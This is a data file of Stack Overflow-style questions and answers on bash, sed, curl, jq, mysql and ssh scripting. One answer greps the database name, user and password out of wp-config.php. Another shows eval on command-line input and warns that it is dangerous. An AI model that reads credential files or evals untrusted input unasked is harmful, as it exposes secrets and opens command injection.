    "Getting sed error": "Given that sed seems to think you're running a delete line command (d), you may want to output the command to see what's actually in that environment variable of yours:\nfor fl in $(S_convertPath ${RESOURCE_DIR}/db)/db.changelog-*xml; do\n    echo sed -i \"s/HOSTNAME/${PSM_SERVER_ADDRESS}/g\" $fl\ndone\nThere's a good chance the PSM_SERVER_ADDRESS is corrupting your sed command (and may need to be processed to make it clean). One way to do this (provided you have a recent enough sed) would be to use delimiters that do not appear in the environment variable, for example:\nsed -i \"s?HOSTNAME?${PSM_SERVER_ADDRESS}?g\" $fl\nSince you've accepted this answer, I may as well add the resolution for the additional problem you found. It appears that BSD sed, unlike Linux, has a requirement that you provide an extension to the -i option. So, while Linux allows:\nsed -i \"sed-command\"\nto edit in-place, the BSD variant needs to have:\nsed -i \"\" \"sed-command\"\nwith an empty backup suffix.\nWithout that, sed may use your command as the extension and your first file name as the command.",
    "upload zip file to google drive using curl": "You can use Drive API v3 to upload the zip file. The modified curl code is as follows.\ncurl -X POST -L \\\n    -H \"Authorization: Bearer `cat /tmp/token.txt`\" \\\n    -F \"metadata={name : 'backup.zip'};type=application/json;charset=UTF-8\" \\\n    -F \"file=@backup.zip;type=application/zip\" \\\n    \"https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart\"\nIn order to use this, please include https://www.googleapis.com/auth/drive in the scope.",
    "Determining age of a file in shell script": "I needed something to test age of a specific file, to not re-download too often. So using GNU date and bash:\n# if file's modtime hour is less than current hour:\n[[ $(date +%k -r GPW/mstall.zip) -lt $(date +%k) ]] && \\\nwget -S -N \\\nhttp://bossa.pl/pub/metastock/mstock/mstall.zip \\\nUpdate--this version works much better for me, and is more accurate and understandable:\n[[ $(date +%s -r mstall.zip) -lt $(date +%s --date=\"77 min ago\") ]] && echo File is older than 1hr 17min\nThe BSD variant (tested on a Mac) is:\n[[ $(stat -f \"%m\" mstall.zip) -lt $(date -j -v-77M +%s) ]] && echo File is older than 1hr 17min",
    "what language uses \"fi\"": "The piece of code is Unix shell. But the answer to the question\nwhat language uses \u201cfi\u201d\nis a bit longer. The usage of mirrored words, like if and fi or case and esac comes from Algol, for a nice summary see comparison of languages. It was Stephen Bourne who carried this from Algol to the Unix shell, he worked first on Algol, later on sh and adb of the early Unix systems. He favored this syntax so much that even the C code he wrote for sh and adb looks like Algol thanks to a bunch of preprocessor macros. The curious can have a look at the 2.11BSD source code of source code of sh or adb. It compiles as C after all. So even in C one can find FI when going back a long way in history.",
    "Difference between stdout and /dev/stdout": "In your case\nstdout is a normal file, created in the same directory where you're running the command.\nSo, when you're redirecting the output of echo to stdout, it is written to the file. You need to do cat (as example, here you did) in order to see the content on screen here.\n/dev/stdout is a device file, which is a link to /proc/self/fd/1, which means it is referring to the file descriptor 1 held by the current process.\nSo, when you're redirecting the output of echo to /dev/stdout, it is sent to the standard output (the screen) directly.",
    "Check database connectivity using Shell script": "Use a script like this:\n#!/bin/sh\necho \"exit\" | sqlplus -L uid/pwd@dbname | grep Connected > /dev/null\nif [ $? -eq 0 ] \nthen\n   echo \"OK\"\nelse\n   echo \"NOT OK\"\nfi\necho \"exit\" assures that your program exits immediately (this gets piped to sqlplus). -L assures that sqlplus won't ask for password if credentials are not ok (which would make it get stuck as well).\n(> /dev/null just hides output from grep, which we don't need because the results are accessed via $? in this case)",
    "bash shell date parsing, start with specific date and loop through each day in month": "[radical@home ~]$ cat a.sh \n#!/bin/bash\n\nSTART=`echo $1 | tr -d _`;\n\nfor (( c=0; c<$2; c++ ))\ndo\n    echo -n \"`date --date=\"$START +$c day\" +%Y_%m_%d` \";\ndone\nNow if you call this script with your params it will return what you wanted:\n[radical@home ~]$ ./a.sh 2010_04_01 6\n2010_04_01 2010_04_02 2010_04_03 2010_04_04 2010_04_05 2010_04_06",
    "How to split a string on a multi-character delimiter in Bash?": "The recommended tool for character subtitution is sed's command s/regexp/replacement/ for one regexp occurence or global s/regexp/replacement/g, you do not even need a loop or variables.\nPipe your echo output and try to substitute the characters mm witht the newline character \\n:\necho \"emmbbmmaaddsb\" | sed 's/mm/\\n/g'\nThe output is:\ne\nbb\naaddsb",
    "Is it bad practice to use python's getattr extensively?": "The difference between direct attribute access and using getattr() should be fairly negligible. You can tell the difference between the two versions' bytecodes by using Python's dis module to compare the two approaches:\n>>> import dis\n>>> dis.dis(lambda x: x.foo)\n  1           0 LOAD_FAST                0 (x)\n              3 LOAD_ATTR                0 (foo)\n              6 RETURN_VALUE        \n>>> dis.dis(lambda x: getattr(x, 'foo'))\n  1           0 LOAD_GLOBAL              0 (getattr)\n              3 LOAD_FAST                0 (x)\n              6 LOAD_CONST               0 ('foo')\n              9 CALL_FUNCTION            2\n             12 RETURN_VALUE  \nIt does, however, sound like you are developing a shell that is very similar to how the Python library cmd does command line shells. cmd lets you create shells that executes commands by matching the command name to a function defined on a cmd.Cmd object like so:\nimport cmd\n\nclass EchoCmd(cmd.Cmd):\n    \"\"\"Simple command processor example.\"\"\"\n\n    def do_echo(self, line):\n        print line\n\n    def do_EOF(self, line):\n        return True\n\nif __name__ == '__main__':\n    EchoCmd().cmdloop()\nYou can read more about the module at either the documentation, or at http://www.doughellmann.com/PyMOTW/cmd/index.html",
    "How to execute mongo commands from bash?": "There are differences between interactive & scripted mongo shell sessions. In particular, commands like use admin are not valid JavaScript and will only work in an interactive shell session.\nThe working equivalent of your shutdown command line would be:\nmongo 192.168.10.20:27000/admin --eval \"db.shutdownServer()\"\nYou can include the database to use in the connection string, and there is no need to quit from a scripted mongo shell session.\nIf you do need to change databases from a scripted session, there is a db.getSiblingDB() JavaScript function. An alternative way to write the shutdown command above would be:\n mongo 192.168.10.20:27000 --eval \"db=db.getSiblingDB('admin');db.shutdownServer()\"",
    "Linux Combine two files by column": "It is far easier to use the join command:\n$ cat a.txt \nID     Name  Telephone       \n1      John     011\n2      Sam      013\n3      Jena     014\n4      Peter    015\n$ cat b.txt \nID     Remark1  Remark2       \n1       Test1    Test2\n2       Test3    Test4\n3       Test5    Test6\n4       Test7    Test8\n5       Test7    Test8\n6       Test7    Test8\n7       Test7    Test8\n8       Test7    Test8\n9       Test7    Test8\n$ join a.txt b.txt \nID Name Telephone Remark1 Remark2\n1 John 011 Test1 Test2\n2 Sam 013 Test3 Test4\n3 Jena 014 Test5 Test6\n4 Peter 015 Test7 Test8\nUse the column command to pretty print it:\n$ join a.txt b.txt | column -t\nID  Name   Telephone  Remark1  Remark2\n1   John   011        Test1    Test2\n2   Sam    013        Test3    Test4\n3   Jena   014        Test5    Test6\n4   Peter  015        Test7    Test8",
    "How to use a for loop in make recipe [duplicate]": "There are two main things you need to know when putting non-trivial shell fragments into make recipes:\nCommands in the recipe are (of course!) executed one at a time, where command means \"tab-prefixed line in the recipe\", possibly spread over several makefile lines with backslashes.\nSo your shell fragment has to be written all on one (possibly backslashed) line. Moreover it's effectively presented to the shell as a single line (the backslashed-newlines are not plain newlines so are not used as command terminators by the shell), so must be syntactically correct as such.\nBoth shell variables and make variables are introduced by dollar signs ($@, $i), so you need to hide your shell variables from make by writing them as $$i. (More precisely, any dollar sign you want to be seen by the shell must be escaped from make by writing it as $$.)\nNormally in a shell script you would write separate commands on separate lines, but here you effectively only get a single line so must separate the individual shell commands with semicolons instead. Putting all this together for your example produces:\nfoo: bar\n    for i in `find $@  -name *_cu.*`; do mv $$i \"$$(echo $$i|sed s/_cu//)\"; done\nor equivalently:\nfoo: bar\n    for i in `find $@  -name *_cu.*`; do      \\\n        mv $$i \"$$(echo $$i|sed s/_cu//)\";    \\\n    done\nNotice that the latter, even though it's laid out readably on several lines, requires the same careful use of semicolons to keep the shell happy.",
    "Shell Scripting: Using bash with xargs": "Try using:\nfind . -name vmware-*.log -print0 | xargs -0 rm\nThis causes find to output a null character after each filename and tells xargs to break up names based on null characters instead of whitespace or other tokens.",
    "How can I *only* get the number of bytes available on a disk in bash?": "You may get exact number of bytes with df:\ndf -B1 /\nFilesystem            1B-blocks        Used   Available Use% Mounted on\n/dev/mapper/cl-root 32893632512 13080072192 18119061504  42% /",
    "Count the number of digits in a bash variable": "Assuming the variable only contains digits then the shell already does what you want here with the length Shell Parameter Expansion.\n$ var=012\n$ echo \"${#var}\"\n3",
    "jq sorts KEY and VALUES in different way - how can I enumerate them in the same order?": "The problem stems from jq's possibly surprising default behavior:\nkeys enumerates the keys alphabetically sorted.\n.[] enumerates the values based on the keys' input order[1]\nIn other words: If you use keys to extract an object's keys in one pass, and then .[] to extract its values in another, the corresponding output elements might not match.\njq v1.5 introduced the keys_unsorted/0 function, which enables a simple solution:\n# Sample input with unordered keys.\n# Sorting the values results in the same order as sorting the keys,\n# so the output order of values below implies the key enumeration order that was applied.\njson='{ \"c\":3, \"a\":1, \"b\":2 }'\nPrint keys in input order, using keys_unsorted/0:\n$ echo \"$json\" | jq -r 'keys_unsorted[]'\nc\na\nb\nPrint values in input order, which [] invariably does:\n$ echo \"$json\" | jq -r '.[]'\n3\n1\n2\nCaveat: Up to version v1.3, using .[] resulted in no guaranteed enumeration order (the underlying hash table's key sorting was used, which is an implementation detail); if you still must use v1.3, you can use the to_entries approach shown below.\n[v1.3+] to_entries/0, as used in user2259432's helpful answer, also enumerates the properties in input order:\n# Extract keys\n$ echo \"$json\" | jq -r 'to_entries | map(.key)[]'\nc\na\nb\n# Extract values\n$ echo \"$json\" | jq -r 'to_entries | map(.value)[]'\n3\n1\n2\nCaveat: Prior to v1.5, to_entries/0 output key-value pairs in sorted-by-key order.\nHowever, since to_entries/0 can be used to enumerate both keys and values, it is still a viable solution for producing a stable enumeration order in parallel key/value extractions, even in pre-v1.5 versions.\n[v1.3+] If, by contrast, you want to enumerate in sorted-by-key order:\nPrint keys in alphabetically sorted order, using keys/0:\n$ echo \"$json\" | jq -r 'keys[]'\na\nb\nc\nPrint values by alphabetically sorted keys:\n$ echo \"$json\" | jq -r 'keys[] as $k | .[$k]'\n1\n2\n3\nA caveat re -S / --sort-keys:\nThis option only applies to whole objects, on output:\n$ echo \"$json\" | jq -Sc '.'\n{\"a\":1,\"b\":2,\"c\":3}  # Sorted by key\nIt doesn't apply when you use an operator or function to access the internals of an object:\n$ echo \"$json\" | jq -S '.[]' # !! -S doesn't apply, because [] always uses input order\n3\n1\n2\n[1] Prior to v1.5, no particular order was guaranteed, resulting the same problem, however.",
    "device /dev/ttyusb0 lock failed: operation not permitted": "I found I was able to fix the situation on my CentOS box by running minicom -S <device> -o and the do the normal exit key sequence (CTRL-a, x).\nIn your situation it would have been\nsudo minicom -S ttyusb0 -o\nThis cleared the lock files minicom had placed in /var/lock/\nGood luck Ash",
    "Bash script with graphical menus": "there is a package called dialog, is this relevant to your requirement?",
    "How to check if folder is empty or have folder file use shell-script? [duplicate]": "From the Bash FAQ #4 -- How can I check whether a directory is empty or not?\nshopt -s nullglob dotglob\nfiles=(*)\n(( ${#files[*]} )) || echo directory is empty\nshopt -u nullglob dotglob\nThis small script fills the array files with each file found in the path expansion *. It then checks to see the size of the array and if it's 0 it prints 'directory is empty'. This will work with hidden files thanks to the use of dotglob.\nNote\nAnswers which ask to parse ls is in general a bad idea and poor form. To understand why, read Why you shouldn't parse the output of ls",
    "How to disable 'zip' warning in bash?": "I think you want the quiet flag.\nzip -uq ${path}.zip ${path}\nFrom the man pages:\n-q\n--quiet\n          Quiet   mode;  eliminate  informational  messages  and  comment\n          prompts.  (Useful, for example, in shell scripts and background\n          tasks).",
    "How to learn your way through Linux's shell": "Just for fun:\n. run.sh --- \"Source\" the code in run.sh. Usually, this is used to get environment variables into the current shell processes. You probably don't want this for a script called run.sh.\n./run.sh --- Execute the run.sh script in the current directory. Generally the current directory is not in the default path (see $PATH), so you need to call out the relative location explicitly. The . character is used differently than in item #1.\n. ./run.sh --- Source the run.sh script in the current directory. This combines the use of . from items #1 and #2.\nsh run.sh --- Use the sh shell interpretor on run.sh. Bourne shell is usually the default for running shell scripts, so this is probably the same as item #2 except it finds the first run.sh in the $PATH rather than the one in the current directory.\nsh ./run.sh --- And this is usually the same as #2 except wordier.\nCommand line interfaces, such as the various shell interpretors, tend to be very esoteric since they need to pack a lot of meaning into a small number of characters. Otherwise typing takes too long.\nIn terms of learning, I'd suggest using bash or ksh and don't let anyone talk you into something else until you are comfortable. Please don't learn with csh or you will need to unlearn too much when you start with a Bourne-type shell later.\nAlso, crontab entries are a bit trickier than other uses of shell. My guess is you lost time because your environment was set differently than on the command line. I would suggest starting somewhere else if possible.",
    "command line locally using wamp": "It might be useful to register php.exe as an ENVIRONMENT VARIABLE so the command line can recognize the 'php' command instead of needing to enter the full path '\\wamp\\bin\\php\\php5.3.8\\php' as the command.\nTo do this, you can follow the steps outlined on this page: http://windows.fyicenter.com/view.php?ID=60. Except for Step 5, enter the path of WAMP's php.exe instead. For example, just add in $;C:\\wamp\\bin\\php\\php5.3.8 to the Variable value field. And each time you open up your command line, just run php using\nphp pageYouAreRunning.php \n..still keeping in mind that the pageYouAreRunning.php is relative to the current path in your command line.",
    "How do I change my Git home folder? [duplicate]": "Maybe this is what you want:\ncd /c/projects\nEDIT:\nif you want it to start up within this directory, then just do this in cmd(admin):\nsetx HOME \"C:\\Projects\"\nafter this you need to restart git-bash.\nTo test variable enter this in git-bash:\necho $HOME",
    "Finding contents of one file in another file": "grep itself is able to do so. Simply use the flag -f:\ngrep -f <patterns> <file>\n<patterns> is a file containing one pattern in each line; and <file> is the file in which you want to search things.\nNote that, to force grep to consider each line a pattern, even if the contents of each line look like a regular expression, you should use the flag -F, --fixed-strings.\ngrep -F -f <patterns> <file>\nIf your file is a CSV, as you said, you may do:\ngrep -f <(tr ',' '\\n' < data.csv) <file>\nAs an example, consider the file \"a.txt\", with the following lines:\nalpha\n0891234\nbeta\nNow, the file \"b.txt\", with the lines:\nAlpha\n0808080\n0891234\nbEtA\nThe output of the following command is:\ngrep -f \"a.txt\" \"b.txt\"\n0891234\nYou don't need at all to for-loop here; grep itself offers this feature.\nNow using your file names:\n#!/bin/bash\npatterns=\"/home/nimish/contents.txt\"\nsearch=\"/home/nimish/another_file.csv\"\ngrep -f <(tr ',' '\\n' < \"${patterns}\") \"${search}\"\nYou may change ',' to the separator you have in your file.",
    "read variables from wp-config.php": "Try this:\nWPDBNAME=`cat wp-config.php | grep DB_NAME | cut -d \\' -f 4`\nWPDBUSER=`cat wp-config.php | grep DB_USER | cut -d \\' -f 4`\nWPDBPASS=`cat wp-config.php | grep DB_PASSWORD | cut -d \\' -f 4`",
    "Using local settings through SSH": "I just came across two alternatives to just doing a git clone of your dotfiles. I take no credit for either of these and can't say I've used either extensively so I don't know if there are pitfalls to either of these.\nsshrc\nsshrc is a tool (actually just a big bash function) that copies over local rc-files without permanently writing them to the remove user's $HOME - the idea being that might be a shared admin account that other people use. Appears to be customizable for different remote hosts as well.\n.ssh/config and LocalCommand\nThis blog post suggests a way to automatically run a command when you login to a remote host. It tars and pipes a set of files to the remote, then un-tars them on the remote's $HOME:\nYour local ~/.ssh/config would look like this:\nHost *\n   PermitLocalCommand yes\n   LocalCommand tar c -C${HOME} .bashrc .bash_profile .exports .aliases .inputrc .vimrc .screenrc \\\n               | ssh -o PermitLocalCommand=no %n \"tar mx -C${HOME}\"\nYou could modify the above to only run the command on certain hosts (instead of the * wildcard) or customize for different hosts as well. There might be a fair amount of duplication per host with this method - although you could package the whole tar c ... | ssh .. \"tar mx ..\" into a script maybe.\nNote the above looks like it clobbers the same files on the remote when you connect, so use with caution.",
    "run python script directly from command line": "Universal running of Python scripts\nYou can pretty much universally run without the shebang (#!) with\npython myscript.py\nOr nearly equivalently (it places the current directory on your path and executes the module named myscript) (preferably do this!):\npython -m myscript\nfrom the command line, as long as you have Python installed and on your path environment variable (i.e. set to run with python, which, if installed, would typically be the case).\nShebangs (#!) are a Unix thing.\nThe shebang, as you're using it, is typically for running on a Unix platform (typically Apple or Linux). Windows would typically require cygwin to use the shebang.\nYou can usually default to whatever python is available on your system path with:\n#!/usr/bin/env python\nAssuming you're on a Unix, you might try other locations for your python setup, like:\n#!/usr/bin/python\nMuddling through\nYou can see what python you're currently using by using the unix which command, so if you want to see where your python is coming from, use this command:\nwhich python\nor on Windows (cygwin probably can run the shebang):\nwhere python\nOn Linux/Unix, you'll need execution perms to run the file as well, in that manner. Use chmod\nchmod +x myscript.py\n(chmod also may apply to Cygwin in Windows)\nIf you're not running as root, you may require sudo, and that would be\nsudo chmod +x myscript.py\nAnd then attempt to run (within the same directory) with\n./myscript.py ",
    "Executing unix shell commands using PHP": "",
    "Get Jenkins environment variables in execute shell": "",
    "POST 4GB file from shell using cURL": "I think you should consider using -T option instead of --data-binary. The --data-binary loads the entire file into memory (curl 7.47). At best it is slow, at worst the OOM killer will reply with a Killed message.\ncurl -XPOST -T big-file.iso https://example.com",
    "Bash 'for' loop syntax?": "Replace\nfor (($i=0...\nwith\nfor ((i=0;i<10;i++))",
    "Iterating over two lists in parallel in /bin/sh": "Probably not portable (look at all those bash-isms!), but it is easy to read and someone else might find it useful...\nlist1=\"a b c\"\nlist2=\"1 2 3\"\narray1=($list1)\narray2=($list2)\n\ncount=${#array1[@]}\nfor i in `seq 1 $count`\ndo\n    echo ${array1[$i-1]} ${array2[$i-1]}\ndone",
    "Bash time format HH:MM in 12 hour format AM/PM": "Format date output:\ndate +\"%I:%M %p\"\ndate +\"%I:%M %P\"\nWhere:\n%I     hour (01..12)\n%M     minute (00..59)\n%p     locale's equivalent of either AM or PM; blank if not known\n%P     like %p, but lower case",
    "bash - SQL Query Outputs to variable": "Taken from bash script - select from database into variable, you can read the query result into a variable.\nExample\nmysql> SELECT * FROM domains;\n+-------+---------+\n| user  | domain  |\n+-------+---------+\n| user1 | domain1 |\n| user2 | domain2 |\n| user3 | domain3 |\n+-------+---------+\nUsage\n$ myvar=$(mysql -D$MYDB -u$MYUSER -p$MYPASS -se \"SELECT domain FROM domains\")\n$ echo $myvar\ndomain1 domain2 domain3\necho is the bash command for output. You can then split $myvar into separate variables:\n$ read var1 var2 var3 <<< $myvar\n$ echo $var1\ndomain1\n$ echo $var2\ndomain2\nYou can combine these two commands into a single one:\nread var1 var2 var3 <<< $(mysql -D$MYDB -u$MYUSER -p$MYPASS -se \"SELECT domain FROM domains\")\nIt is possible to store the results into arrays (useful if you don't know how many records there):\n$ read -ra vars <<< $(mysql -D$MYDB -u$MYUSER -p$MYPASS -se \"SELECT domain FROM domains\")\n$ for i in \"${vars[@]}\"; do\n$     echo $i\n$ done\ndomain1\ndomain2\ndomain3",
    "Convert hexadecimal color to decimal RGB values in UNIX shell script": "$ cat hexrgb.sh\n#!/bin/bash\nhex=\"11001A\"\nprintf \"%d %d %d\\n\" 0x${hex:0:2} 0x${hex:2:2} 0x${hex:4:2}\n\n$ ./hexrgb.sh\n17 0 26\nIf you are not willing to use bash for substring expansion, I'd still use printf for the conversion.",
    "Prefixing logs with date in shell script": "echodate()\n{\n    echo `date +%y/%m/%d_%H:%M:%S`:: $*\n}\n\nechodate Some text 1\nechodate Some text 2",
    "How to get first match with sed?": "Quit after matching the first one.\nsed -n -e '/version/ {s/.* = *//p;q}' build.gradle",
    "How can I escape any of the special shell characters in a Python string?": "In Python3, the required batteries are included as shlex.quote.\nshlex.quote(s)\nReturn a shell-escaped version of the string s. The returned value is a string that can safely be used as one token in a shell command line [\u2026].\nIn your example:\nimport shlex\n\ns = \"The$!cat#&ran\\\"'up()a|<>tree`\\;\"\nprint(shlex.quote(s))\nOutput:\n'The$!cat#&ran\"'\"'\"'up()a|<>tree`\\;'",
    "How to get the program name in a fish shell script?": "To get the same result as your command, it is the script filename you are looking for.\nThis information is not stored in a variable, but you get this by querying status.\nbasename (status -f)      # The name of the file\nstatus -f                 # The full path of the file\nMore information: http://fishshell.com/docs/2.0/commands.html#status",
    "What RETVAL means?": "$? gives the status of the last command executed. In your case, the last command executed was action.... . The exit status of this command will be present in $? which is later captured in the RETVAL variable. If the command was successful, $? will contain 0, else a non-zero value.",
    "Extract xml tag value using awk command": "You can use awk as shown below, however, this is NOT a robust solution and will fail if the xml is not formatted correctly e.g. if there are multiple elements on the same line.\n$ dt=$(awk -F '[<>]' '/IntrBkSttlmDt/{print $3}' file)\n$ echo $dt\n1967-08-13\nI suggest you use a proper xml processing tool, like xmllint.\n$ dt=$(xmllint --shell file <<< \"cat //IntrBkSttlmDt/text()\" | grep -v \"^/ >\")\n$ echo $dt\n1967-08-13",
    "Linux: what does echo $! in Linux? [closed]": "$! PID of last job running in background.",
    "execute python script with function from command line, Linux": "This\nif __name__ == \"__main__\":\n    command= \" \".join( sys.argv[1:] )\n    eval( command )\nThis will work. But it's insanely dangerous.\nYou really need to think about what your command-line syntax is. And you need to think about why you're breaking the long-established Linux standards for specifying arguments to a program.\nFor example, you should consider removing the useless ()'s in your example. Make it this, instead.\npython convertImage.py convertFile fileName\nThen, you can -- with little work -- use argparse to get the command (\"convertFile\") and the arguments (\"fileName\") and work within the standard Linux command line syntax.\nfunction_map = { \n    'convertFile': convertFile,\n    'conv': convertFile,\n}\nparser = argparse.ArgumentParser()\nparser.add_argument( 'command', nargs=1 )\nparser.add_argument( 'fileName', nargs='+' )\nargs= parser.parse_args()\nfunction = function_map[args.command]\nfunction( args.fileName )",
    "Why is Standard Input is not displayed as I type in Mac OS X Terminal application?": "Maybe this is because there was an error while running Django. Sometimes it happens that the std input disappears because stty was used. You can manually hide your input by typing:\n$ stty -echo\nNow you won't see what you typed. To restore this and solve your problem just type\n$ stty echo\nThis could help.",
    "How to pass variable within printf": "Your problem is that you are using single-quotes. Parameters are not expanded within single quotes.\nParameters are expanded in double-quotes, though:\nprintf \"Are you sure you want $lrus lrus: \"\nIf you're using a shell that supports read -p, then avoid the separate print. Supplying a prompt this way is better (it understands your terminal width, for one thing):\nread -p \"Specify lrus [default 128]: \" -r lrus\nread -p \"Are you sure you want $lrus lrus? \" -r ans",
    "Difference between linux variables $BASH_SUBSHELL vs $SHLVL": "No, manually running a new shell (via /bin/sh or /bin/bash etc.) is not a subshell in this context.\nA subshell is when the shell spawns a new shell instance on its own to handle some work.\nUsing Command Substitution (i.e. $(command)) is a subshell (as is the older backticks invocation).\nUsing a pipeline (i.e. echo '5.1+5.3' | bc -l) creates subshells for each component of the pipeline.\nUsing Process Substitution (i.e. <(command)) creates a subshell.\nGrouping commands (i.e. (declare a=5; echo $a)) creates a subshell.\nRunning commands in the background (i.e. sleep 1 &) creates a subshell.\nThere may be other things as well but those are the common cases.\nTesting this is easy:\n$ printf \"Outside: $BASH_SUBSHELL , $SHLVL\\nInside: $(echo $BASH_SUBSHELL , $SHLVL)\\n\"\nOutside: 0 , 1\nInside: 1 , 1\n$ (printf \"Outside: $BASH_SUBSHELL , $SHLVL\\nInside: $(echo $BASH_SUBSHELL , $SHLVL)\\n\")\nOutside: 1 , 1\nInside: 2 , 1\n$ bash -c 'printf \"Outside: $BASH_SUBSHELL , $SHLVL\\nInside: $(echo $BASH_SUBSHELL , $SHLVL)\\n\"'\nOutside: 0 , 2\nInside: 1 , 2\n$ bash -c '(printf \"Outside: $BASH_SUBSHELL , $SHLVL\\nInside: $(echo $BASH_SUBSHELL , $SHLVL)\\n\")'\nOutside: 1 , 2\nInside: 2 , 2\nThe source of your quote (the generally poor, and often better avoided, ABS) even demonstrates this a little bit (and in a rather unclear manner, just another instance of the general lack of rigor and quality in that \"Advanced\" guide):\necho \" \\$BASH_SUBSHELL outside subshell       = $BASH_SUBSHELL\"           # 0\n  ( echo \" \\$BASH_SUBSHELL inside subshell        = $BASH_SUBSHELL\" )     # 1\n  ( ( echo \" \\$BASH_SUBSHELL inside nested subshell = $BASH_SUBSHELL\" ) ) # 2\n# ^ ^                           *** nested ***                        ^ ^\n\necho\n\necho \" \\$SHLVL outside subshell = $SHLVL\"       # 3\n( echo \" \\$SHLVL inside subshell  = $SHLVL\" )   # 3 (No change!)",
    "write text from comand line into Hadoop": "Hadoop document states appendToFile and put can read stdin\necho \"hello world\" | hadoop fs -appendToFile - /dir/hadoop/hello_world.txt\necho \"hello world\" | hadoop fs -put - /dir/hadoop/hello_world.txt",
    "Android shell get foreground app package name [duplicate]": "",
    "Call shell commands from Laravel controller?": "",
    "how to remove \"TERM environment variable not set\"": "Running a program that demands a terminal via cron can lead to problems; it won't have a terminal when it is run by cron.\nIn case of doubt, though, ensure that the variable is set in the script, by adding a line:\nexport TERM=${TERM:-dumb}\nIf the environment variable TERM is already set, this is a no-op. If it is not, it sets the terminal to a standard one with minimal capabilities \u2014 this satisfies the program that complains about TERM not being set.",
    "Restore default working dir if bat file is terminated abruptly": "In your batch script use setlocal to encapsulate the running environment of your batch session. If the user terminates the script before you cd or popd to return, your script will still exit in the directory in which it started. Here's a brief test:\n@echo off\nsetlocal\npushd c:\\Users\ncd\nexit /b\nOutput:\nC:\\Users\\me\\Desktop>test.bat\nc:\\Users\n\nC:\\Users\\me\\Desktop>\nNotice I didn't popd or cd %userprofile%\\Desktop, but I still ended up back at my Desktop after the script exited.\nAdditionally, setlocal keeps you from junking up your environment with orphaned variables that mean nothing outside of your batch script. It's just good practice. At the console, type help setlocal for more info.",
    "Bash script to get all IP addresses": "ifconfig was obsoleted by ip. It also has the flag -o that write outputs easy to parse. Use ip -4 to show only IPV4 addresses. Note the simpler script, it already exclude the loopback address:\nip -o addr | awk '!/^[0-9]*: ?lo|link\\/ether/ {print $2\" \"$4}'\nOr if you don't want the networks:\nip -o addr | awk '!/^[0-9]*: ?lo|link\\/ether/ {gsub(\"/\", \" \"); print $2\" \"$4}'",
    "getopts won't call twice in a row? [duplicate]": "Just add:\nlocal OPTIND\nat the top of your function.",
    "\"[0: command not found\" in Bash [duplicate]": "Need a space after [ and no space before or after = in the assignment. $(($i+1))) would try to execute the output of the ((...)) expression and I am sure that's not what you want. Also, you are missing a $ before the array name.\nWith these things corrected, your while loop would be:\n#!/bin/bash\ni=0\nwhile [ \"$i\" -le \"${#myarray[@]}\" ]\ndo \n  echo \"Welcome $i times\"\n  i=$((i + 1))\ndone\ni=$((i + 1)) can also be written as ((i++))\nit is always better to enclose variables in double quotes inside [ ... ]\ncheck your script through shellcheck - you can catch most basic issues there\nSee also:\nWhy should there be a space after '[' and before ']' in Bash?\nHow to use double or single brackets, parentheses, curly braces\nCommand not found error in Bash variable assignment\nUsing [ ] vs [[ ]] in a Bash if statement",
    "Using a variable's value as password for scp, ssh etc. instead of prompting for user input every time": "Indeed, you'll definitely want to look into setting up ssh keys, over saving a password in a bash script. If the key is passwordless, then no user input will be required to ssh/scp. You just set it up to use the key on both ends and voila, secured communication.\nHowever, I'll get downvoted to hell if I don't say this. Many consider passwordless ssh keys to be a Bad Idea(TM). If anybody gets their hands on the keys, the have full access. This means that you are relying on other security measures such as file permissions to keep your password safe.\nAlso, look into ssh-agent. It allows you to set it up so that you have a password protected ssh-key, but you only need to type it in once and it will manage the password for the key for you and use it when necessary. On my linux box at home, I have ssh-agent set up to run in my .xinitrc file so that it prompts me once and then starts X. YMMV.\nUPDATE:\nWith regards to your requirements, password protected public key authentication + ssh-agent still seems to fit. Only the developers privy to the SSH/FTP password could start up ssh-agent, type in the password and ssh-agent would manage the passwords for the public keys for the rest of the session, never requiring interaction again.\nOf course, how it stores it is another matter entirely. IANASE, but for more information on security concerns of using ssh-agent, I found symantec's article to be pretty informative: http://www.symantec.com/connect/articles/ssh-and-ssh-agent\n\"The ssh-agent creates a unix domain socket, and then listens for connections from /usr/bin/ssh on this socket. It relies on simple unix permissions to prevent access to this socket, which means that any keys you put into your agent are available to anyone who can connect to this socket. [ie. root]\" ...\n\"however, [..] they are only usable while the agent is running -- root could use your agent to authenticate to your accounts on other systems, but it doesn't provide direct access to the keys themselves. This means that the keys can't be taken off the machine and used from other locations indefinitely.\"\nHopefully you're not in a situation where you're trying to use an untrusted root's system.",
    "Curl: don't wait for response [duplicate]": "If you have a large number of requests you want to issue quickly, and you don't care about the output, there are two things you should do:\nDo more requests with the same connection.\nFor small requests, it's generally much faster to do 10 requests each on 1 connection, than 1 request each on 10 connections. For Henry's HTTP post test server, the difference is 2.5x:\n$ time for i in {1..10}; do\n    curl -F foo=bar https://posttestserver.com/post.php ;\n  done\nSuccessfully dumped 1 post variables.\nView it at http://www.posttestserver.com/data/2016/06/09/11.44.48536583865\nPost body was 0 chars long.\n(...)\nreal    0m2.429s\nvs\n$ time  {\n    array=();\n    for i in {1..10}; do\n      array+=(--next -F foo=bar https://posttestserver.com/post.php ) ; \n    done; \n    curl \"${array[@]}\";\n }\nSuccessfully dumped 1 post variables.\nView it at http://www.posttestserver.com/data/2016/06/09/11.45.461371907842\n(...)\nreal    0m1.079s\nProcess at most a N connections in parallel, to avoid DoS'ing the host or your machine\nHere sem from GNU parallel is limiting the number of parallel connections to 4. This is a better version of backgrounding and waiting, since it will always ensure full capacity.\nfor i in {1..20}\ndo \n  sem -j 4 curl -F foo=bar https://posttestserver.com/post.php\ndone\nsem --wait\nThe number of parallel requests you want depends on how beefy the host is. A realistic number could be 32+\nCombine the two strategies, and you should see a hefty speedup without DoS'ing yourself.",
    "Greet a user differently on the time of day - Bash Script": "h=`date +%H`\n\nif [ $h -lt 12 ]; then\n  echo Good morning\nelif [ $h -lt 18 ]; then\n  echo Good afternoon\nelse\n  echo Good evening\nfi",
    "Bash's equivalent of Tcsh's ESC-p to jump to command starting with what you typed so far": "Add this to your ~/.inputrc file:\n\"\\e[5~\": history-search-backward\n\"\\e[6~\": history-search-forward\nThis will make PageUp act like tcsh's Esc+p and PageDown will go forward through the list.\nYou can bind \\ep instead. If you use PageUp / PageDown, you may need to see what character sequence your keyboard/terminal produces. Just press Ctrl+V then PageUp and you'll see ^[[5~ if it's the same as \\e[5~.",
